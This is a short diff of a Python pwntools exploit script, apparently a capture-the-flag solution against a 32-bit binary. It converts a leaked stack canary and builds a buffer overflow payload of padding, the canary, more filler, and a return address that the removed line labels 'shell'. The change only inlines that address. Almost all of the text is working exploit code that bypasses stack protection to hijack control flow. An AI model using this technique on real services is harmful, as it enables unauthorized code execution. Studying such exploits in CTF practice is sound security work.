@@ -667,8 +667,6 @@ canary_list = ''.join(byte_result)
 canary_hex = bytes.fromhex(canary_list)
 canary = u32(canary_hex)
 
-shell = 0x080486b9
-
 p.sendafter(b'> ', b'E')
 p.sendlineafter(b'Name Size : ', b'1000')
 p.recvuntil(b'Name : ')
@@ -676,7 +674,7 @@ p.recvuntil(b'Name : ')
 payload = b'A' * 64 
 payload += p32(canary)
 payload += b'B' * 8
-payload += p32(shell)
+payload += p32(0x080486b9)
 
 p.sendline(payload)
 
